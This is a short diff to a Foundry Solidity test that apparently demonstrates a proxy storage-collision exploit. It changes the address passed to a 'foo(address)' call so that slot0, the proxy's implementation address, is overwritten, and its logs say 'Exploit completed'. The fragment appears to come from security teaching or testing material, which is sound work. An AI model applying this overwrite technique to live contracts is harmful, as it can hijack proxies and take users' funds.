@@ -14,7 +14,7 @@ contract ContractTest is Test {
 
         console.log("Current implementation contract address:",ProxyContract.implementation());
         ProxyContract.invoke(
-            abi.encodeWithSignature("foo(address)",address(this)));
+            abi.encodeWithSignature("foo(address)",address(0x0)));
         console.log("Overwrited slot0 implementation contract address:",ProxyContract.implementation());
         console.log("Exploit completed");
     }
